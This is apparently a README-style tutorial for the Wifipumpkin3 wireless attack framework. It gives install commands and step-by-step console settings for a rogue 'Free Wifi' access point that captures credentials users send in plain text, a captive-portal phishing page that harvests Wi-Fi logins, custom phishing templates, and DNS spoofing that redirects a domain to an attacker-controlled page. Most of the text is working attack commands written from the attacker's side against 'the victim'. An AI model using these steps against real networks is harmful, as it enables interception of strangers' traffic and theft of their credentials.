# Wifipumpkin3

## Features

- Rogue access point attack

- Man-in-the-middle attack

- Module for deauthentication attack

- Module for extra-captiveflask templates

- Rogue DNS Server

- Captive portal attack (captiveflask)

- Intercept, inspect, modify and replay web traffic

- WiFi networks scanning

- DNS monitoring service

- Credentials harvesting

- Transparent Proxies

- LLMNR, NBT-NS, and MDNS poisoner

## Installation

#### 1) Install dependencies

    sudo apt install libssl-dev libffi-dev build-essential

#### 2) Download the tool and install the rest of the dependencies

    git clone https://github.com/P0cL4bs/wifipumpkin3.git
    cd wifipumpkin3
    sudo apt install python3-pyqt5

Then,

    python3 setup.py install

#### 3) Create a fake access point with the name of "Free wifi" to do Man-in-the-Middle attacks

Run the tool

    sudo wifipumpkin3

Set up your tool

    set interface wlan0
    set ssid Free Wifi
    set proxy noproxy
    ignore pydns_server
    start

Then, when the victim connects to our fake AP, he will receive a malicious IP from our DHCP server.

When a victim connects to an HTTP website that does not have SSL/TLS encryption in transit and inserts data in user input textbox like "username, password, email" for example, Wifipumpkin captures traffic and the credentials entered by the victim in plain text.

#### 4) Captive portal attack

Similar to the first attack, but this time it uses a secure page where the victim must enter credentials (username and password) for the Wi-Fi. Can be used when we are doing an evil twin attack.

Run your tool

    sudo wifipumpkin3

Set up your tool

    set interface wlan0
    set ssid Hotspot
    set proxy captiveflask true
    ignore pydns_server
    start

When the victim connects to our "Hotspot" wifi, he will be redirected to a login page to enter credentials before he can use the internet.

Credentials have been captured by Wifipumpkin and displayed in a table form.

#### 5) Custom Captiveflask

We can use another captive flask than the generic one from the previous attack. It allows us to generate custom templates for a captive flask to phish our targets.

    show
    use misc.extra_captiveflask
    help
    download

After downloading it, list the custom templates, then use anyone you wish in the list

    list
    install example

Then,

    sudo python3 setup.py install

Now make the attack, but this time, use our customized captive flask we have downloaded.

    set interface wlan0
    set ssid Open Wifi
    set proxy captiveflask
    set captiveflask.example true
    ignore pydns_server
    start

Now, the victim will see a login page according to the template we chose to install.

#### 6) DNS Spoofing

Just as we can use the customized flask, which is in the tool, we could also use the HTML document, which we have created, and would like to use it for the attack on a user. Below, we can see that we are in the
“www” “HTML” directory here is where any HTML file that we need to use for a website is located, we
would create an HTML file which displays “lorem ipsum dolor sit amet consectetur adipiscing elit” below, we would see the
walkthrough on how to do this.

    cd /var/www/html
    echo "lorem ipsum dolor sit amet consectetur adipiscing elit" > index.html
    service apache2 start
    ifconfig eth0

Now that we have created the HTML file and know the IP address for our Ethernet cable, let's go into
wifipumpkin and try to add this new HTML file to our command, and see how we can spoof the DNS server
so that when we visit the site, the DNS server will spoof it to the page, which we want it to be

    set interface wlan0
    set ssid HA
    set proxy noproxy
    ignore pydns_server
    show
    use spoof.dns_spoof
    set domains vulnweb.com
    set redirectTo 192.168.1.2
    start

Now, when the victim connects to the SSID "HA", and visits the webpage "vulnweb.com", he would be redirected by the DNS server to the page which we created on our attacking
machine.
